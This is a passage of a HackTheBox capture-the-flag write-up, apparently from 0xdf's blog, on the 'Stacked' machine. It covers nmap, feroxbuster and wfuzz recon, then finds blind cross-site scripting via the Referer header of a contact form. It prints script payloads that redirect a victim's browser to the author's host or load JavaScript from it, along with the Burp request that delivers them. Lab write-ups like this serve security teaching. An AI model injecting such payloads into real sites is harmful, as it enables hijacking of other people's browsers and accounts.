@@ -1,0 +1,1214 @@
+<article class="post h-entry" itemscope="" itemtype="http://schema.org/BlogPosting">
+<header class="post-header">
+<h1 class="post-title p-name" itemprop="name headline">HTB: Stacked</h1>
+<p class="post-meta">
+<span class="tag-list"><a class="post-tag" href="/tags#hackthebox">hackthebox</a> <a class="post-tag" href="/tags#ctf">ctf</a> <a class="post-tag" href="/tags#htb-stacked">htb-stacked</a> <a class="post-tag" href="/tags#nmap">nmap</a> <a class="post-tag" href="/tags#localstack">localstack</a> <a class="post-tag" href="/tags#feroxbuster">feroxbuster</a> <a class="post-tag" href="/tags#wfuzz">wfuzz</a> <a class="post-tag" href="/tags#vhosts">vhosts</a> <a class="post-tag" href="/tags#docker">docker</a> <a class="post-tag" href="/tags#docker-compose">docker-compose</a> <a class="post-tag" href="/tags#xss">xss</a> <a class="post-tag" href="/tags#burp">burp</a> <a class="post-tag" href="/tags#burp-repeater">burp-repeater</a> <a class="post-tag" href="/tags#xss-referer">xss-referer</a> <a class="post-tag" href="/tags#aws">aws</a> <a class="post-tag" href="/tags#awslocal">awslocal</a> <a class="post-tag" href="/tags#aws-lambda">aws-lambda</a> <a class="post-tag" href="/tags#cve-2021-32090">cve-2021-32090</a> <a class="post-tag" href="/tags#command-injection">command-injection</a> <a class="post-tag" href="/tags#pspy">pspy</a> <a class="post-tag" href="/tags#container">container</a> <a class="post-tag" href="/tags#htb-crossfit">htb-crossfit</a> <a class="post-tag" href="/tags#htb-bankrobber">htb-bankrobber</a> <a class="post-tag" href="/tags#htb-bucket">htb-bucket</a> <a class="post-tag" href="/tags#htb-epsilon">htb-epsilon</a> <a class="post-tag" href="/tags#oswe-like">oswe-like</a> <a class="post-tag" href="/tags#oscp-plus-v2">oscp-plus-v2</a> </span><br/><br/>
+<time class="dt-published" datetime="2022-03-19T13:45:00+00:00" itemprop="datePublished">Mar 19, 2022
+      </time></p>
+</header>
+<div class="post-content e-content" itemprop="articleBody">
+<div class="row">
+<div class="col-sm-3">
+<div class="sticky-top">
+<p><a href="/2022/03/19/htb-stacked.html" style="color: #e6e6e6; text-decoration: none;">HTB: Stacked</a></p>
+<!--https://afeld.github.io/bootstrap-toc/-->
+<nav data-toggle="toc" id="toc"></nav>
+</div>
+</div>
+<div class="col-sm-9" id="postBody">
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/stacked-cover.webp" type="image/webp"/>
+<img alt="Stacked" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/stacked-cover.png" style="float: right; margin-right:50px; margin-left:50px; height:120px;">
+</img></picture>
+<p>Stacked was really hard. The foothold involved identifying XSS in a referer header that landed in an mail application that I could not see. I’ll use the XSS to enumerate that mailbox and find a subdomain used for an instance of localstack. From there, I’ll find I can create Lambda functions, and there’s a command injection vulnerability in the dashboard if it displays a malformed function name. I’ll use the XSS to load that page in an IFrame and trigger the vulnerability, providing a foothold in the localstack container. To escalate in that container, I’ll use Pspy to monitor what happens when localstack runs a lambda function, and find that it is also vulnerable to command injection as root. From root in the container, I can get full access to the host filesystem and a shell. In Beyond Root, I’ll take a look at the mail application and the automations triggering the XSS vulnerabilities.</p>
+<h2 id="box-info">Box Info</h2>
+<!-- https://app.hackthebox.com/machines/379 -->
+<table>
+<thead>
+<tr>
+<th>Name</th>
+<th style="text-align: right"><a href="https://hackthebox.com/machines/stacked" style="font-size: xx-large; text-shadow: 0 0 5px #ffffff, 0 0 7px #ffffff; color: #1756a9" target="_blank">Stacked</a> <a href="https://hackthebox.com/machines/stacked" target="_blank"><picture style="float: right; padding-left: 20px;"><source srcset="/icons/box-stacked.webp" type="image/webp"/> <img alt="Stacked" class="img-av" src="/icons/box-stacked.png"/></picture></a><br/><a href="https://hackthebox.com/machines/stacked" style="font-size: small; color: white;" target="_blank">Play on HackTheBox</a></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Release Date</td>
+<td style="text-align: right"><a href="https://twitter.com/hackthebox_eu/status/1438517284247531523">18 Sep 2021</a></td>
+</tr>
+<tr>
+<td>Retire Date</td>
+<td style="text-align: right">19 Mar 2022</td>
+</tr>
+<tr>
+<td>OS</td>
+<td style="text-align: right">Linux <picture><source srcset="/icons/Linux.webp" type="image/webp"/><img alt="Linux" class="img-os" src="/icons/Linux.png"/></picture></td>
+</tr>
+<tr>
+<td>Base Points</td>
+<td style="text-align: right"><span class="diff-Insane">Insane [50]</span></td>
+</tr>
+<tr>
+<td>Rated Difficulty</td>
+<td style="text-align: right"><picture><source srcset="/img/stacked-diff.webp" type="image/webp"/><img alt="Rated difficulty for Stacked" src="/img/stacked-diff.png" style="display: unset;"/></picture></td>
+</tr>
+<tr>
+<td>Radar Graph</td>
+<td style="text-align: right"><picture><source srcset="/img/stacked-radar.webp" type="image/webp"/><img alt="Radar chart for Stacked" src="/img/stacked-radar.png" style="display: unset;"/></picture></td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-user.webp" type="image/webp"/><img alt="First Blood User" src="/icons/first-blood-user.png" style="display: unset"/></picture></td>
+<td style="text-align: right"><span class="blood-time">01:18:05</span><a href="https://app.hackthebox.com/users/87804" rel="noopener" target="_blank"><img alt="jazzpizazz" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/87804" style="display: unset"/><span class="user-text" style="display: none"> jazzpizazz</span></a><br/></td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-root.webp" type="image/webp"/><img alt="First Blood Root" src="/icons/first-blood-root.png" style="display: unset"/></picture></td>
+<td style="text-align: right"><span class="blood-time">05:34:08</span><a href="https://app.hackthebox.com/users/12507" rel="noopener" target="_blank"><img alt="Ziemni" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/12507" style="display: unset"/><span class="user-text" style="display: none"> Ziemni</span></a><br/></td>
+</tr>
+<tr>
+<td>Creator</td>
+<td style="text-align: right"><a href="https://app.hackthebox.com/users/114053" rel="noopener" target="_blank"><img alt="TheCyberGeek" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/114053" style="display: unset"/><span class="user-text" style="display: none"> TheCyberGeek</span></a><br/></td>
+</tr>
+</tbody>
+</table>
+<h2 id="recon">Recon</h2>
+<h3 id="nmap">nmap</h3>
+<p><code class="language-plaintext highlighter-rouge">nmap</code> finds three open TCP ports, SSH (22), HTTP (80), and a service <code class="language-plaintext highlighter-rouge">nmap</code> identifies as Docker (2376):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>nmap <span class="nt">-p-</span> <span class="nt">--min-rate</span> 10000 <span class="nt">-oA</span> scans/nmap-alltcp 10.10.11.112
+<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2022-03-16 17:35 UTC
+Nmap scan report for stacked.htb (10.10.11.112)
+Host is up (0.022s latency).
+Not shown: 65532 closed ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+2376/tcp open  docker
+
+Nmap done: 1 IP address (1 host up) scanned in 7.63 seconds
+
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span>nmap <span class="nt">-p</span> 22,80,2376 <span class="nt">-sCV</span> <span class="nt">-oA</span> scans/nmap-tcpscripts 10.10.11.112
+<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2022-03-16 17:35 UTC
+Nmap scan report for stacked.htb (10.10.11.112)
+Host is up (0.019s latency).
+
+PORT     STATE SERVICE     VERSION
+22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+80/tcp   open  http        Apache httpd 2.4.41
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: STACKED.HTB
+2376/tcp open  ssl/docker?
+| ssl-cert: Subject: commonName=0.0.0.0
+| Subject Alternative Name: DNS:localhost, DNS:stacked, IP Address:0.0.0.0, IP Address:127.0.0.1, IP Address:172.17.0.1
+| Not valid before: 2021-07-17T15:37:02
+|_Not valid after:  2022-07-17T15:37:02
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 11.20 seconds
+</span></code></pre></div></div>
+<p>Based on the <a href="https://packages.ubuntu.com/search?keywords=openssh-server">OpenSSH</a> and <a href="https://packages.ubuntu.com/search?keywords=apache2">Apache</a> versions, the host is likely running Ubuntu 20.04 Focal. There’s a TLS certificate on 2376, but it doesn’t seem to have much useful information.</p>
+<h3 id="website---tcp-80">Website - TCP 80</h3>
+<h4 id="site">Site</h4>
+<p>The site is for Stacked.htb, and it says it’s coming soon:</p>
+<div style="max-height: 400px; overflow: hidden; position: relative; margin-bottom: 20px;">
+<a href="https://0xdfimages.gitlab.io/img/image-20210823134258552.png">
+<img alt="image-20210823134258552" src="https://0xdfimages.gitlab.io/img/image-20210823134258552.png" style="clip-path: polygon(0 0, 100% 0, 100% 360px, 49% 390px, 51% 370px, 0 400px); -webkit-clip-path: polygon(0 0, 100% 0, 100% 360px, 49% 390px, 51% 370px, 0 400px)"/>
+</a>
+<div style="position: absolute; right: 20px; top: 375px"><a href="https://0xdfimages.gitlab.io/img/image-20210823134258552.png"><i>Click for full image</i></a></div>
+</div>
+<p>Given the reference to <code class="language-plaintext highlighter-rouge">stacked.htb</code>, I’ll add that to my <code class="language-plaintext highlighter-rouge">hosts</code> file, but the site loads exactly the same by domain name.</p>
+<p>The “Get notify by email” form at the bottom just sends a GET request to <code class="language-plaintext highlighter-rouge">index.html</code> with no parameters (not even the email given), so there’s not much here.</p>
+<h4 id="tech-stack">Tech Stack</h4>
+<p>The root page also loads as <code class="language-plaintext highlighter-rouge">index.html</code> (as observed in the form submission above), which doesn’t give much of a hint about what it is. Nothing exciting in the response headers. Apache is serving the site.</p>
+<h4 id="directory-brute-force">Directory Brute Force</h4>
+<p>I’ll run <code class="language-plaintext highlighter-rouge">feroxbuster</code> against the site, but it doesn’t find anything interesting:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>feroxbuster <span class="nt">-u</span> http://stacked.htb
+<span class="go">
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben "epi" Risher 🤓                 ver: 2.3.1
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://stacked.htb
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+ 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.3.1
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+ 🔃  Recursion Depth       │ 4
+ 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Cancel Menu™
+──────────────────────────────────────────────────
+</span><span class="feroxbuster-yellow">301</span><span class="go">        9l       28w      311c http://stacked.htb/images
+</span><span class="feroxbuster-yellow">301</span><span class="go">        9l       28w      310c http://stacked.htb/fonts
+</span><span class="feroxbuster-red">403</span><span class="go">        9l       28w      276c http://stacked.htb/server-status
+[</span><span class="feroxbuster-yellow">####################</span><span class="go">] - 1m     89997/89997   0s      </span><span class="feroxbuster-green">found</span><span class="go">:3       </span><span class="feroxbuster-red">errors</span><span class="go">:150    
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 1m     29999/29999   396/s   http://stacked.htb
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 1m     29999/29999   399/s   http://stacked.htb/images
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 1m     29999/29999   422/s   http://stacked.htb/fonts
+</span></code></pre></div></div>
+<h3 id="virtual-hosts">Virtual Hosts</h3>
+<p>Given there’s a domain mentioned on the page, I’ll look for subdomains with <code class="language-plaintext highlighter-rouge">wfuzz</code>. I’ll start it with no filter and immediately Ctrl-C it to cancel:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>wfuzz <span class="nt">-H</span> <span class="s2">"Host: FUZZ.stacked.htb"</span> <span class="nt">-u</span> http://stacked.htb <span class="nt">-w</span> /usr/seclists/Discovery/DNS/subdomains-top1million-20000.txt 
+<span class="go">********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://stacked.htb/
+Total requests: 19966
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+000000001:   302        9 L      26 W       284 Ch      "www"
+000000009:   302        9 L      26 W       287 Ch      "cpanel"
+000000006:   302        9 L      26 W       285 Ch      "smtp"
+000000012:   302        9 L      26 W       284 Ch      "ns2"
+000000003:   302        9 L      26 W       284 Ch      "ftp"
+000000010:   302        9 L      26 W       284 Ch      "whm"
+000000011:   302        9 L      26 W       284 Ch      "ns1"
+000000008:   302        9 L      26 W       284 Ch      "pop"
+000000007:   302        9 L      26 W       288 Ch      "webdisk"
+000000005:   302        9 L      26 W       288 Ch      "webmail"
+000000002:   302        9 L      26 W       285 Ch      "mail"
+^C
+</span></code></pre></div></div>
+<p>It’s clear that the length in characters changes with the payload, but the words doesn’t. I’ll add <code class="language-plaintext highlighter-rouge">--hw 26</code> to hide the default response, and start it again. This time it finds only one more subdomain (as well as two errors):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>wfuzz <span class="nt">-H</span> <span class="s2">"Host: FUZZ.stacked.htb"</span> <span class="nt">-u</span> http://stacked.htb <span class="nt">-w</span> /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt <span class="nt">--hw</span> 26
+<span class="go">********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://stacked.htb/
+Total requests: 19966
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+000001183:   200        444 L    1779 W     30268 Ch    "portfolio"
+000009532:   400        12 L     53 W       424 Ch      "#www"
+000010581:   400        12 L     53 W       424 Ch      "#mail"
+
+Total time: 0
+Processed Requests: 19966
+Filtered Requests: 19963
+Requests/sec.: 0
+</span></code></pre></div></div>
+<h3 id="portfoliostackedhtb---tcp-80">portfolio.stacked.htb - TCP 80</h3>
+<h4 id="site-1">Site</h4>
+<p>This page is more about stacked.htb, and their localstack development:</p>
+<div style="max-height: 600px; overflow: hidden; position: relative; margin-bottom: 20px;">
+<a href="https://0xdfimages.gitlab.io/img/image-20210824100250115.png">
+<img alt="image-20210824100250115" src="https://0xdfimages.gitlab.io/img/image-20210824100250115.png" style="clip-path: polygon(0 0, 100% 0, 100% 560px, 49% 590px, 51% 570px, 0 600px); -webkit-clip-path: polygon(0 0, 100% 0, 100% 560px, 49% 590px, 51% 570px, 0 600px)"/>
+</a>
+<div style="position: absolute; right: 20px; top: 575px"><a href="https://0xdfimages.gitlab.io/img/image-20210824100250115.png"><i>Click for full image</i></a></div>
+</div>
+<p><a href="https://github.com/localstack/localstack">LocalStack</a> allows for running an AWS-like environment on a local machine. In the middle of the page, there’s a section on their software:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20210824100501624.webp" type="image/webp"/>
+<img alt="image-20210824100501624" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210824100501624.png"/>
+</picture>
+<p>The “Free Download!” button provides <code class="language-plaintext highlighter-rouge">docker-compose.yml</code>:</p>
+<div class="language-yml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">version</span><span class="pi">:</span> <span class="s2">"</span><span class="s">3.3"</span>
+
+<span class="na">services</span><span class="pi">:</span>
+  <span class="na">localstack</span><span class="pi">:</span>
+    <span class="na">container_name</span><span class="pi">:</span> <span class="s2">"</span><span class="s">${LOCALSTACK_DOCKER_NAME-localstack_main}"</span>
+    <span class="na">image</span><span class="pi">:</span> <span class="s">localstack/localstack-full:0.12.6</span>
+    <span class="na">network_mode</span><span class="pi">:</span> <span class="s">bridge</span>
+    <span class="na">ports</span><span class="pi">:</span>
+      <span class="pi">-</span> <span class="s2">"</span><span class="s">127.0.0.1:443:443"</span>
+      <span class="pi">-</span> <span class="s2">"</span><span class="s">127.0.0.1:4566:4566"</span>
+      <span class="pi">-</span> <span class="s2">"</span><span class="s">127.0.0.1:4571:4571"</span>
+      <span class="pi">-</span> <span class="s2">"</span><span class="s">127.0.0.1:${PORT_WEB_UI-8080}:${PORT_WEB_UI-8080}"</span>
+    <span class="na">environment</span><span class="pi">:</span>
+      <span class="pi">-</span> <span class="s">SERVICES=serverless</span>
+      <span class="pi">-</span> <span class="s">DEBUG=1</span>
+      <span class="pi">-</span> <span class="s">DATA_DIR=/var/localstack/data</span>
+      <span class="pi">-</span> <span class="s">PORT_WEB_UI=${PORT_WEB_UI- }</span>
+      <span class="pi">-</span> <span class="s">LAMBDA_EXECUTOR=${LAMBDA_EXECUTOR- }</span>
+      <span class="pi">-</span> <span class="s">LOCALSTACK_API_KEY=${LOCALSTACK_API_KEY- }</span>
+      <span class="pi">-</span> <span class="s">KINESIS_ERROR_PROBABILITY=${KINESIS_ERROR_PROBABILITY- }</span>
+      <span class="pi">-</span> <span class="s">DOCKER_HOST=unix:///var/run/docker.sock</span>
+      <span class="pi">-</span> <span class="s">HOST_TMP_FOLDER="/tmp/localstack"</span>
+    <span class="na">volumes</span><span class="pi">:</span>
+      <span class="pi">-</span> <span class="s2">"</span><span class="s">/tmp/localstack:/tmp/localstack"</span>
+      <span class="pi">-</span> <span class="s2">"</span><span class="s">/var/run/docker.sock:/var/run/docker.sock"</span>
+</code></pre></div></div>
+<p>This config specifies a LocalStack Docker container listening on 443, 4566, 4571, and probably 8080, offering different services. The <code class="language-plaintext highlighter-rouge">SERVICES=serverless</code> is a keyword specifically defined on the <a href="https://github.com/localstack/localstack">localstack GitHub</a>:</p>
+<blockquote>
+<p><code class="language-plaintext highlighter-rouge">serverless</code>: run services often used for Serverless apps (<code class="language-plaintext highlighter-rouge">iam</code>, <code class="language-plaintext highlighter-rouge">lambda</code>, <code class="language-plaintext highlighter-rouge">dynamodb</code>, <code class="language-plaintext highlighter-rouge">apigateway</code>, <code class="language-plaintext highlighter-rouge">s3</code>, <code class="language-plaintext highlighter-rouge">sns</code>)</p>
+</blockquote>
+<p>A bit further down the page there’s a “Contact Me” form:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20210824100721981.webp" type="image/webp"/>
+<img alt="image-20210824100721981" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210824100721981.png"/>
+</picture>
+<p>This form actually does submit:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/process.php</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">portfolio.stacked.htb</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">application/json, text/javascript, */*; q=0.01</span>
+<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded; charset=UTF-8</span>
+<span class="na">X-Requested-With</span><span class="p">:</span> <span class="s">XMLHttpRequest</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">78</span>
+<span class="na">Origin</span><span class="p">:</span> <span class="s">http://portfolio.stacked.htb</span>
+<span class="na">DNT</span><span class="p">:</span> <span class="s">1</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Referer</span><span class="p">:</span> <span class="s">http://portfolio.stacked.htb/</span>
+<span class="na">Pragma</span><span class="p">:</span> <span class="s">no-cache</span>
+<span class="na">Cache-Control</span><span class="p">:</span> <span class="s">no-cache</span>
+
+fullname=test&amp;email=0xdf%40stacked.htb&amp;tel=012345667890&amp;subject=test&amp;message=test
+</code></pre></div></div>
+<p>A message pops up on the page:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20210824102236663.webp" type="image/webp"/>
+<img alt="image-20210824102236663" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210824102236663.png"/>
+</picture>
+<h4 id="directory-brute-force-1">Directory Brute Force</h4>
+<p><code class="language-plaintext highlighter-rouge">feroxbuster</code> doesn’t find anything interesting here either:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>feroxbuster <span class="nt">-u</span> http://portfolio.stacked.htb
+<span class="go">
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben "epi" Risher 🤓                 ver: 2.3.1
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://portfolio.stacked.htb
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+ 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.3.1
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+ 🔃  Recursion Depth       │ 4
+ 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Cancel Menu™
+──────────────────────────────────────────────────
+</span><span class="feroxbuster-yellow">301</span><span class="go">        9l       28w      330c http://portfolio.stacked.htb/files
+</span><span class="feroxbuster-yellow">301</span><span class="go">        9l       28w      331c http://portfolio.stacked.htb/assets
+</span><span class="feroxbuster-yellow">301</span><span class="go">        9l       28w      327c http://portfolio.stacked.htb/js
+</span><span class="feroxbuster-yellow">301</span><span class="go">        9l       28w      328c http://portfolio.stacked.htb/css
+</span><span class="feroxbuster-red">403</span><span class="go">        9l       28w      286c http://portfolio.stacked.htb/server-status
+[</span><span class="feroxbuster-yellow">####################</span><span class="go">] - 1m    149995/149995  0s      </span><span class="feroxbuster-green">found</span><span class="go">:5       </span><span class="feroxbuster-red">errors</span><span class="go">:385    
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 1m     29999/29999   282/s   http://portfolio.stacked.htb
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 1m     29999/29999   284/s   http://portfolio.stacked.htb/files
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 1m     29999/29999   287/s   http://portfolio.stacked.htb/assets
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 1m     29999/29999   293/s   http://portfolio.stacked.htb/js
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 1m     29999/29999   303/s   http://portfolio.stacked.htb/css
+</span></code></pre></div></div>
+<p>Each of those 301s just redirects to adding <code class="language-plaintext highlighter-rouge">/</code> to the end and a 403 in return.</p>
+<h2 id="identify-localstack-vhost">Identify LocalStack VHost</h2>
+<h3 id="identify-xss">Identify XSS</h3>
+<h4 id="strategy">Strategy</h4>
+<p>This is a cross-site scripting challenge that is quite difficult to identify, and the kind of thing that only belongs in the Insane level on a HTB machine. Given that I only have one real way to interact with the site at this point, I’ll focus on the contact form on portfolio.stacked.htb.</p>
+<p>When I submit the form, there’s nothing displayed back to me, but rather it’s somehow transmitted to a potential user of the site. Thinking about ways to interact with the user, two come to mind:</p>
+<ul>
+<li>Sending a link to a page I’m hosting, and using various methods to exploit the user from there.</li>
+<li>Sending kind of cross-site scripting (XSS) payload that will be handled as HTML/JS on the receiving end, allowing me to run JavaScript and get the browser to take actions on my behalf.</li>
+</ul>
+<h4 id="links">Links</h4>
+<p>I’ll submit various kinds of links to the form. The phone number and email fields have tight restrictions, so I can’t place a link in them. But I’ll try the rest. For example:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20210824105617868.webp" type="image/webp"/>
+<img alt="image-20210824105617868" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210824105617868.png"/>
+</picture>
+<p>I’ll also go into Burp and forward this request to Repeater. There I can get past the client-side filtering and send links in the other fields.</p>
+<p>With a Python webserver watching for any contact, none comes.</p>
+<h4 id="xss-fails">XSS Fails</h4>
+<p>Turning to XSS, I tried started with a basic payload that would just redirect the page to my server:</p>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span><span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="o">=</span><span class="dl">"</span><span class="s2">http://10.10.14.6/referer</span><span class="dl">"</span><span class="nt">&lt;/script&gt;</span>
+</code></pre></div></div>
+<p>On submitting, it pops an error:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20210824111614093.webp" type="image/webp"/>
+<img alt="image-20210824111614093" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210824111614093.png"/>
+</picture>
+<p>There’s two ways to get around an error like this. One would be to try to bypass the filter with creative payloads that don’t trigger the filter but still execute JavaScript I provide. Unfortunately, I wasn’t able to find any way to do that.</p>
+<p>The other is to try other fields. I’ll go through Burp to try the fields with client-side filtering, but all of them trigger the alert.</p>
+<h4 id="referer">Referer</h4>
+<p>Thinking about what happens on submitting, there is an HTTP POST request to <code class="language-plaintext highlighter-rouge">process.php</code>. This script will parse the incoming request, pulling out whatever information from the request it wants, and generate some way to send that to the user who needs to handle the requests.</p>
+<p>There may be cases where it makes sense to include something like the referrer header in this information. For example, if the same web page is used to manage contact me submissions from multiple sites. There’s a real life example of XSS in the Referer header <a href="https://www.horizon3.ai/news/disclosures/mautic-unauth-xss-to-rce">on Horizon3</a>.</p>
+<p>I’ll kick the form submission request over to Burp Repeater and set the referrer header to the XSS payload:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/process.php</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">portfolio.stacked.htb</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">application/json, text/javascript, */*; q=0.01</span>
+<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded; charset=UTF-8</span>
+<span class="na">X-Requested-With</span><span class="p">:</span> <span class="s">XMLHttpRequest</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">208</span>
+<span class="na">Origin</span><span class="p">:</span> <span class="s">http://portfolio.stacked.htb</span>
+<span class="na">DNT</span><span class="p">:</span> <span class="s">1</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Referer</span><span class="p">:</span> <span class="s">&lt;script&gt;document.location="http://10.10.14.6/referer"&lt;/script&gt;</span>
+
+fullname=0xdf&amp;email=0xdf%40stacked.htb&amp;tel=012345667890&amp;subject=Help&amp;message=Please+help
+</code></pre></div></div>
+<p>On sending that, a few minutes later there are three requests at my Python webserver:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>python3 <span class="nt">-m</span> http.server 80
+<span class="go">Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.11.112 - - [24/Aug/2021 11:15:04] code 404, message File not found
+10.10.11.112 - - [24/Aug/2021 11:15:04] "GET /referer HTTP/1.1" 404 -
+10.10.11.112 - - [24/Aug/2021 11:15:04] code 404, message File not found
+10.10.11.112 - - [24/Aug/2021 11:15:04] "GET /favicon.ico HTTP/1.1" 404 -
+10.10.11.112 - - [24/Aug/2021 11:15:04] code 404, message File not found
+10.10.11.112 - - [24/Aug/2021 11:15:04] "GET /favicon.ico HTTP/1.1" 404 -
+</span></code></pre></div></div>
+<p>It actually makes life a bit easier if instead of redirecting the entire page to me, I just have it load JavaScript from my server. I’ll try with this payload:</p>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"http://10.10.14.6/xss.js"</span><span class="nt">&gt;&lt;/script&gt;</span>
+</code></pre></div></div>
+<p>A minute later:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>10.10.11.112 - - [24/Aug/2021 11:27:04] code 404, message File not found
+10.10.11.112 - - [24/Aug/2021 11:27:04] "GET /xss.js HTTP/1.1" 404 -
+</code></pre></div></div>
+<h3 id="orient">Orient</h3>
+<h4 id="url">URL</h4>
